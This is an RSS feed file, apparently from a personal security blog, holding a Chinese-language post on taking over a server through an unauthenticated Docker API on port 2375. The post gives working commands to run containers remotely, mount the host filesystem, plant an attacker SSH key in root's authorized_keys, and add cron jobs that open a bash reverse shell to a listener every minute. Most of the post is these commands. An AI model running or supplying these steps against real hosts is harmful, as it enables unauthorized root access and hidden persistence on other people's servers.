@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>内网渗透 on BU44ER's BLOG</title><link>https://bu44er.ink/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link><description>Recent content in 内网渗透 on BU44ER's BLOG</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 22 Jan 2025 23:20:26 +0800</lastBuildDate><atom:link href="https://bu44er.ink/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml"/><item><title>Docker未授权致RCE</title><link>https://bu44er.ink/p/c767958d/</link><pubDate>Wed, 22 Jan 2025 23:20:26 +0800</pubDate><guid>https://bu44er.ink/p/c767958d/</guid><description>&lt;ul>
+&lt;li>参考谢公子：&lt;a class="link" href="https://cloud.tencent.com/developer/article/2321247" target="_blank" rel="noopener"
+>Site Unreachable&lt;/a>&lt;/li>
+&lt;li>在实战中遇到了记一下，最终可以直接 ssh 登录 + 反弹 shell 到内网其他主机&lt;/li>
+&lt;/ul>
+&lt;h2 id="测试过程">测试过程
+&lt;/h2>&lt;h3 id="docker-未授权">docker 未授权
+&lt;/h3>&lt;p>nmap 扫描发现 2375 端口开放 docker 服务，测试以下 URL 发现 docker 未授权：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://x.x.x.x:2375/version
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://x.x.x.x:2375/images
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://x.x.x.x:2375/info
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="docker-远程命令">docker 远程命令
+&lt;/h3>&lt;p>可以在本地使用命令远程管理 docker：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">docker -H tcp://&amp;lt;IP&amp;gt;:2375 images -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker -H tcp://&amp;lt;IP&amp;gt;:2375 ps
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker -H tcp://&amp;lt;IP&amp;gt;:2375 &lt;span class="nb">exec&lt;/span> -it e7d97caf249d /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="获取宿主机权限">获取宿主机权限
+&lt;/h3>&lt;p>容器里面操作没啥意义，关键是要获取宿主机（目标服务器）的权限。&lt;/p>
+&lt;p>启动一个未开启的容器，然后将&lt;strong>宿主机的磁盘挂载到容器中&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">docker -H tcp://&amp;lt;IP&amp;gt;:2375 run -it -v /:/opt b76f96a98a27 /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>-v /:/opt&lt;/code>：-v 选项的作用是选择挂载卷，此处将宿主机的整个文件系统 &lt;code>/&lt;/code> 挂载到容器内的 &lt;code>/opt&lt;/code> 目录下。&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>因此，我们可以通过容器内 &lt;code>/opt&lt;/code> 目录，管理宿主机文件系统。&lt;/strong>&lt;/p>
+&lt;h3 id="写入ssh公钥">写入SSH公钥
+&lt;/h3>&lt;p>管理文件系统并不算真正获取权限，但是也快了。&lt;/p>
+&lt;p>先在本地生成一对 SSH 的公私钥对，然后直接 echo 把 SSH 公钥写入服务器的公钥文件：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 本地生成公私钥对&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-keygen -t rsa -b &lt;span class="m">2048&lt;/span> -f ~/.ssh/id_rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 默认保存在 ~/.ssh , 私钥是 id_rsa , 公钥是 id_rsa.pub&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 修改服务器文件：进入docker容器挂的宿主机文件系统&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /opt/root/.ssh/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># echo 写入公钥（id_rsa.pub的内容）&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ssh-rsa jdiofjsdoijfosjdsjfosdjfo...&amp;#34;&lt;/span> &amp;gt;&amp;gt; authorized_keys
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>没有.ssh目录或者 authorized_keys 文件就自己创建一个&lt;/li>
+&lt;/ul>
+&lt;p>服务器写入公钥之后，本地可以直接通过&lt;strong>指定私钥文件&lt;/strong>来登录服务器：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh -i ~/.ssh/id_rsa root@&amp;lt;IP&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="持久化">持久化
+&lt;/h3>&lt;p>最后做一步权限维持，给宿主机设置&lt;strong>定时任务&lt;/strong>。&lt;/p>
+&lt;p>将反弹 shell 的命令写入 &lt;code>/var/spool/cron/root&lt;/code> 文件中：&lt;/p>
+&lt;ul>
+&lt;li>也可能是 &lt;code>/var/spool/cron/crontab/root&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /opt/var/spool/cron
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;*/1 * * * * /bin/bash -i&amp;gt;&amp;amp;/dev/tcp/&amp;lt;IPonListening&amp;gt;/4444 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span> &amp;gt;&amp;gt; root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>含义是每隔一分钟，反弹一次 shell&lt;/li>
+&lt;/ul>
+&lt;p>假如服务器默认 shell 是 zsh，需要把反弹 shell 命令改成：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;*/1 * * * * bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IPonListening&amp;gt;/10341 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span> &amp;gt;&amp;gt; root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>注意，目标服务器可能出不了网，只能反弹 shell 到内网，需要有一台内网机器，可以之后再由内网机器配置转发到外网。&lt;/p></description></item></channel></rss>
